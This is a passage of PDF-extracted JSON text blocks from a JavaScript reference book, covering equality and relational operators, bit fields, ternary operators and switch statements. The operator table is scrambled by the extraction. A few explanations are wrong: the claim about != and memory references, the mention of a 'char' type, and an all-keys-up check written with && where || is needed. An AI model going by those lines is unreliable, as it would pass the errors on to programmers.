        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 68",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  a  =   'hello'   &&   '' ;                    // a = '' var  b  =   ''   &&   [];                         // b = '' var  c  =   undefined   &&   0 ;                   // c = undefined var  d  =   1   &&   5 ;                           // d = 5 var  e  =   0   &&   {};                          // e = 0 var  f  =   'hi'   &&   []   &&   'done' ;             // f = 'done' var  g  =   'bye'   &&   undefined   &&   'adios' ;    // g = undefined",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This trick can be used, for example, to set a default value to a function argument (prior to ES6).",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  foo  =   function ( val )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // if val evaluates to falsey, 'default' will be returned instead.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     return  val  ||   'default' ; } console. log (  foo ( 'burger' )   );    // burger console. log (  foo ( 100 )   );         // 100 console. log (  foo ([])   );          // [] console. log (  foo ( 0 )   );           // default console. log (  foo ( undefined )   );   // default",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Just keep in mind that for arguments,  0  and (to a lesser extent) the empty string are also often valid values that should be able to be explicitly passed and override a default, which, with this pattern, they won \u2019 t (because they are",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "falsy ).",
        "font_name": "OpenSans-Italic",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 10.9: Empty Array",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "/* ToNumber(ToPrimitive([])) == ToNumber(false) */",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "[]   ==   false ;   // true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "When  [] . toString ()  is executed it calls  [] . join ()  if it exists, or  Object. prototype . toString ()  otherwise. This comparison is returning  true  because  [] . join ()  returns  ''  which, coerced into  0 , is equal to false  ToNumber . Beware though, all objects are truthy and  Array  is an instance of  Object :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// Internally this is evaluated as ToBoolean([]) === true ? 'truthy' : 'falsy'",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "[]   ?   'truthy'   :   'falsy' ;   // 'truthy'",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 10.10: Equality comparison operations",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "JavaScript has four di\ufb00erent equality comparison operations.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "SameValue",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "It returns  true  if both operands belong to the same Type and are the same value. Note: the value of an object is a reference. You can use this comparison algorithm via  Object. is  (ECMAScript 6). Examples:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Object. is ( 1 ,   1 );              // true Object. is (+ 0 ,   - 0 );            // false Object. is ( NaN ,   NaN );          // true Object. is ( true ,   \"true\" );      // false Object. is ( false ,   0 );          // false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 69",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Object. is ( null ,   undefined );   // false Object. is ( 1 ,   \"1\" );            // false Object. is ([],   []);            // false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This algorithm has the properties of an  equivalence relation : Re\ufb02exivity :  Object. is ( x ,  x )  is  true , for any value  x Symmetry :  Object. is ( x ,  y )  is  true  if, and only if,  Object. is ( y ,  x )  is  true , for any values  x  and  y . Transitivity : If  Object. is ( x ,  y )  and  Object. is ( y ,  z )  are  true , then  Object. is ( x ,  z )  is also  true , for any values  x ,  y  and  z .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "SameValueZero",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "It behaves like SameValue, but considers  +0  and  -0  to be equal. You can use this comparison algorithm via  Array. prototype . includes  (ECMAScript 7). Examples:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ 1 ] . includes ( 1 );              // true [+ 0 ] . includes (- 0 );            // true [ NaN ] . includes ( NaN );          // true [ true ] . includes ( \"true\" );      // false [ false ] . includes ( 0 );          // false [ 1 ] . includes ( \"1\" );            // false [ null ] . includes ( undefined );   // false [[]] . includes ([]);            // false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This algorithm still has the properties of an  equivalence relation : Re\ufb02exivity :  [ x ] . includes ( x )  is  true , for any value  x Symmetry :  [ x ] . includes ( y )  is  true  if, and only if,  [ y ] . includes ( x )  is  true , for any values  x  and  y . Transitivity : If  [ x ] . includes ( y )  and  [ y ] . includes ( z )  are  true , then  [ x ] . includes ( z )  is also  true , for any values  x ,  y  and  z .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Strict Equality Comparison",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "It behaves like SameValue, but Considers  +0  and  -0  to be equal. Considers  NaN  di\ufb00erent than any value, including itself You can use this comparison algorithm via the  ===  operator (ECMAScript 3). There is also the  !==  operator (ECMAScript 3), which negates the result of  === . Examples:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "1   ===   1 ;              // true + 0   ===   - 0 ;            // true NaN   ===   NaN ;          // false true   ===   \"true\" ;      // false false   ===   0 ;          // false 1   ===   \"1\" ;            // false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "null   ===   undefined ;   // false",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "[]   ===   [];            // false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This algorithm has the following properties:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 70",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Symmetry :  x  ===  y  is  true  if, and only if, y === x is true ,   for  any values x and y`. Transitivity : If  x  ===  y  and  y  ===  z  are  true , then  x  ===  z  is also  true , for any values  x ,  y  and  z . But is not an  equivalence relation  because NaN  is not  re\ufb02exive :  NaN   !==   NaN",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Abstract Equality Comparison",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "If both operands belong to the same Type, it behaves like the Strict Equality Comparison. Otherwise, it coerces them as follows: undefined  and  null  are considered to be equal When comparing a number with a string, the string is coerced to a number When comparing a boolean with something else, the boolean is coerced to a number When comparing an object with a number, string or symbol, the object is coerced to a primitive If there was a coercion, the coerced values are compared recursively. Otherwise the algorithm returns  false . You can use this comparison algorithm via the  ==  operator (ECMAScript 1). There is also the  !=  operator (ECMAScript 1), which negates the result of  == . Examples:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "1   ==   1 ;              // true + 0   ==   - 0 ;            // true NaN   ==   NaN ;          // false true   ==   \"true\" ;      // false false   ==   0 ;          // true 1   ==   \"1\" ;            // true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "null   ==   undefined ;   // true",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "[]   ==   [];            // false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This algorithm has the following property: Symmetry :  x  ==  y  is  true  if, and only if,  y  ==  x  is  true , for any values  x  and  y . But is not an  equivalence relation  because NaN  is not  re\ufb02exive :  NaN   !=   NaN Transitivity  does not hold, e.g.  0   ==   ''  and  0   ==   '0' , but  ''   !=   '0'",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 10.11: Relational operators (<, <=, >, >=)",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "When both operands are numeric, they are compared normally:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "1   <   2          // true 2   <=   2         // true 3   >=   5         // false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "true   <   false   // false (implicitly converted to numbers, 1 > 0)",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "When both operands are strings, they are compared lexicographically (according to alphabetical order):",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "'a'   <   'b'      // true '1'   <   '2'      // true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 71",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "'100'   >   '12'   // false ('100' is less than '12' lexicographically!)",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "When one operand is a string and the other is a number, the string is converted to a number before comparison:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "'1'   <   2        // true '3'   >   2        // true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "true   >   '2'     // false (true implicitly converted to number, 1 < 2)",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "When the string is non-numeric, numeric conversion returns  NaN  (not-a-number). Comparing with  NaN  always returns  false :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "1   <   'abc'      // false 1   >   'abc'      // false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "But be careful when comparing a numeric value with  null ,  undefined  or empty strings:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "1   >   ''          // true 1   <   ''          // false 1   >   null        // true 1   <   null        // false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "1   >   undefined   // false 1   <   undefined   // false",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "When one operand is a object and the other is a number, the object is converted to a number before comparison.So  null  is particular case because  Number ( null ); //0",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "new  Date ( 2015 )<   1479480185280              // true null   >   - 1                                  //true ({ toString : function (){ return   123 }})   >   122    //true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 10.12: Inequality",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Operator  !=  is the inverse of the  ==  operator. Will return  true  if the operands aren't equal. The JavaScript engine will try and convert both operands to matching types if they aren't of the same type.  Note:  if the two operands have di\ufb00erent internal references in memory, then  false  will be returned.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Sample:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "1   !=   '1'       // false 1   !=   2         // true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In the sample above,  1   !=   '1'  is  false  because, a primitive number type is being compared to a  char  value. Therefore, the JavaScript engine doesn't care about the datatype of the R.H.S value. Operator:  !==  is the inverse of the  ===  operator. Will return true if the operands are not equal or if their types do not match. Example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "1   !==   '1'      // true 1   !==   2        // true 1   !==   1        // false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 72",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 10.13: List of Comparison Operators",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Operator Comparison Example ==",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Equal",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "i  ==   0 ===",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Equal Value and Type",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "i  ===   \"5\" !=",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Not Equal",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "i  !=   5 !==",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Not Equal Value or Type  i  !==   5 > Greater than",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "i  >   5 <",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Less than",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "i  <   5 >=",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Greater than or equal",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "i  >=   5 <=",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Less than or equal",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "i  <=   5",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 10.14: Grouping multiple logic statements",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "You can group multiple boolean logic statements within parenthesis in order to create a more complex logic evaluation, especially useful in if statements.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "if   (( age  >=   18   &&  height  >=   5.11 )   ||   ( status  ===   'royalty'   &&  hasInvitation ))   {   console. log ( 'You can enter our club' ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "We could also move the grouped logic to variables to make the statement a bit shorter and descriptive:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  isLegal  =  age  >=   18 ; var  tall  =  height  >=   5.11 ; var  suitable  =  isLegal  &&  tall ; var  isRoyalty  =  status  ===   'royalty' ; var  specialCase  =  isRoyalty  &&  hasInvitation ; var  canEnterOurBar  =  suitable  ||  specialCase ; if   ( canEnterOurBar )  console. log ( 'You can enter our club' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Notice that in this particular example (and many others), grouping the statements with parenthesis works the same as if we removed them, just follow a linear logic evaluation and you'll \ufb01nd yourself with the same result. I do prefer using parenthesis as it allows me to understand clearer what I intended and might prevent for logic mistakes.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 10.15: Bit \ufb01elds to optimise comparison of multi state data",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "A bit \ufb01eld is a variable that holds various boolean states as individual bits. A bit on would represent true, and o\ufb00 would be false. In the past bit \ufb01elds were routinely used as they saved memory and reduced processing load. Though the need to use bit \ufb01eld is no longer so important they do o\ufb00er some bene\ufb01ts that can simplify many processing tasks. For example user input. When getting input from a keyboard's direction keys up, down, left, right you can encode the various keys into a single variable with each direction assigned a bit. Example reading keyboard via bit\ufb01eld",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  bitField  =   0 ;    // the value to hold the bits",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "const  KEY_BITS  =   [ 4 , 1 , 8 , 2 ];   // left up right down const  KEY_MASKS  =   [ 0b1011 , 0b1110 , 0b0111 , 0b1101 ];   // left up right down window. onkeydown   =  window. onkeyup   =   function   ( e )   {      if ( e. keyCode   >=   37   &&  e. keyCode   < 41 ){",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 73",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "         if ( e. type   ===   \"keydown\" ){             bitField  |=  KEY_BITS [ e. keyCode   -   37 ];          } else {             bitField  &=  KEY_MASKS [ e. keyCode   -   37 ];          }      }      }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Example reading as an array",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  directionState  =   [ false , false , false , false ]; window. onkeydown   =  window. onkeyup   =   function   ( e )   {      if ( e. keyCode   >=   37   &&  e. keyCode   < 41 ){         directionState [ e. keyCode   -   37 ]   =  e. type   ===   \"keydown\" ;      }      }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "To turn on a bit use bitwise  or   |  and the value corresponding to the bit. So if you wish to set the 2nd bit  bitField |=  0b10  will turn it on. If you wish to turn a bit o\ufb00 use bitwise  and   &  with a value that has all by the required bit on. Using 4 bits and turning the 2nd bit o\ufb00  bitfield  &=  0b1101 ; You may say the above example seems a lot more complex than assigning the various key states to an array. Yes, it is a little more complex to set but the advantage comes when interrogating the state. If you want to test if all keys are up.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// as bit field if (! bitfield )   // no keys are on // as array test each item in array",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "if (!( directionState [ 0 ]   &&  directionState [ 1 ]   &&  directionState [ 2 ]   &&  directionState [ 3 ])){",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "You can set some constants to make things easier",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// postfix U,D,L,R for Up down left right",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "const  KEY_U  =   1 ; const  KEY_D  =   2 ; const  KEY_L  =   4 ; const  KEY_R  =   8 ; const  KEY_UL  =  KEY_U  +  KEY_L ;   // up left const  KEY_UR  =  KEY_U  +  KEY_R ;   // up Right const  KEY_DL  =  KEY_D  +  KEY_L ;   // down left const  KEY_DR  =  KEY_D  +  KEY_R ;   // down right",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "You can then quickly test for many various keyboard states",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "if   (( bitfield  &  KEY_UL )   ===  KEY_UL )   {   // is UP and LEFT only down if   ( bitfield   &  KEY_UL )   {               // is Up left down if   (( bitfield  &  KEY_U )   ===  KEY_U )   {     // is Up only down",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "if   ( bitfield  &  KEY_U )   {                 // is Up down (any other key may be down) if   (!( bitfield  &  KEY_U ))   {              // is Up up (any other key may be down)",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "if   (! bitfield  )   {                       // no keys are down if   ( bitfield  )   {                        // any one or more keys are down",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The keyboard input is just one example. Bit\ufb01elds are useful when you have various states that must in combination be acted on. JavaScript can use up to 32 bits for a bit \ufb01eld. Using them can o\ufb00er signi\ufb01cant performance increases. They are worth being familiar with.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 74",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 11: Conditions",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Conditional expressions, involving keywords such as if and else, provide JavaScript programs with the ability to perform di\ufb00erent actions depending on a Boolean condition: true or false. This section covers the use of JavaScript conditionals, Boolean logic, and ternary statements.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 11.1: Ternary operators",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Can be used to shorten if/else operations. This comes in handy for returning a value quickly (i.e. in order to assign it to another variable). For example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  animal  =   'kitty' ; var  result  =   ( animal  ===   'kitty' )   ?   'cute'   :   'still nice' ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In this case,  result  gets the 'cute' value, because the value of animal is 'kitty'. If animal had another value, result would get the 'still nice' value. Compare this to what the code would like with  if / else  conditions.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  animal  =   'kitty' ; var  result  =   '' ; if   ( animal  ===   'kitty' )   {     result  =   'cute' ; }   else   {     result  =   'still nice' ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The  if  or  else  conditions may have several operations. In this case the operator returns the result of the last expression.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  a  =   0 ; var  str  =   'not a' ; var  b  =   '' ; b  =  a  ===   0   ?   ( a  =   1 ,  str  +=   ' test' )   :   ( a  =   2 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Because  a  was equal to 0, it becomes  1 , and  str  becomes 'not a test'. The operation which involved  str  was the last, so  b  receives the result of the operation, which is the value contained in  str , i.e. 'not a test'. Ternary operators  always  expect else conditions, otherwise you'll get a syntax error. As a workaround you could return a zero something similar in the else branch - this doesn't matter if you aren't using the return value but just shortening (or attempting to shorten) the operation.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  a  =   1 ; a  ===   1   ?  alert ( 'Hey, it is 1!' )   :   0 ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "As you see,  if   ( a  ===   1 )  alert ( 'Hey, it is 1!' );  would do the same thing. It would be just a char longer, since it doesn't need an obligatory  else  condition. If an  else  condition was involved, the ternary method would be much cleaner.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "a  ===   1   ?  alert ( 'Hey, it is 1!' )   :  alert ( 'Weird, what could it be?' ); if   ( a  ===   1 )  alert ( 'Hey, it is 1!' )   else  alert ( 'Weird, what could it be?' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 75",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Ternaries can be nested to encapsulate additional logic. For example",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "foo  ?  bar  ?   1   :   2   :   3",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// To be clear, this is evaluated left to right // and can be more explicitly expressed as:",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "foo  ?   ( bar  ?   1   :   2 )   :   3",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This is the same as the following  if / else",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "if   ( foo )   {    if   ( bar )   {      1    }   else   {      2    } }   else   {    3 }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Stylistically this should only be used with short variable names, as multi-line ternaries can drastically decrease readability. The only statements which cannot be used in ternaries are control statements. For example, you cannot use return or break with ternaries. The following expression will be invalid.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  animal  =   'kitty' ; for   ( var  i  =   0 ;  i  <   5 ;   ++ i )   {      ( animal  ===   'kitty' )   ?   break : console. log ( i ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "For return statements, the following would also be invalid:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  animal  =   'kitty' ; ( animal  ===   'kitty' )   ?   return   'meow'   :   return   'woof' ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "To do the above properly, you would return the ternary as follows:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  animal  =   'kitty' ; return   ( animal  ===   'kitty' )   ?   'meow'   :   'woof' ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 11.2: Switch statement",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Switch statements compare the value of an expression against 1 or more values and executes di\ufb00erent sections of code based on that comparison.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  value  =   1 ; switch   ( value )   {    case   1 :     console. log ( 'I will always run' );      break ;    case   2 :     console. log ( 'I will never run' );      break ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 76",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The  break  statement \"breaks\" out of the switch statement and ensures no more code within the switch statement is executed. This is how sections are de\ufb01ned and allows the user to make \"fall through\" cases. Warning : lack of a  break  or  return  statement for each case means the program will continue to evaluate the next case, even if the case criteria is unmet!",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "switch   ( value )   {    case   1 :     console. log ( 'I will only run if value === 1' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // Here, the code \"falls through\" and will run the code under case 2",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   case   2 :     console. log ( 'I will run if value === 1 or value === 2' );      break ;    case   3 :     console. log ( 'I will only run if value === 3' );      break ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The last case is the  default  case. This one will run if no other matches were made.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  animal  =   'Lion' ; switch   ( animal )   {    case   'Dog' :     console. log ( 'I will not run since animal !== \"Dog\"' );      break ;    case   'Cat' :     console. log ( 'I will not run since animal !== \"Cat\"' );      break ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   default :",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    console. log ( 'I will run since animal does not match any other case' ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "It should be noted that a case expression can be any kind of expression. This means you can use comparisons, function calls, etc. as case values.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  john ()   {    return   'John' ; } function  jacob ()   {    return   'Jacob' ; } switch   ( name )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   case  john ():   // Compare name with the return value of john() (name == \"John\")",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    console. log ( 'I will run if name === \"John\"' );      break ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   case   'Ja'   +   'ne' :   // Concatenate the strings together then compare (name == \"Jane\")",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    console. log ( 'I will run if name === \"Jane\"' );      break ;    case  john ()   +   ' '   +  jacob ()   +   ' Jingleheimer Schmidt' :     console. log ( 'His name is equal to name too!' );      break ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Multiple Inclusive Criteria for Cases",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Since cases \"fall through\" without a  break  or  return  statement, you can use this to create multiple inclusive criteria:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 77",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  x  =   \"c\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "switch   ( x )   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    case   \"a\" :     case   \"b\" :     case   \"c\" :       console. log ( \"Either a, b, or c was selected.\" );        break ;     case   \"d\" :       console. log ( \"Only d was selected.\" );        break ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
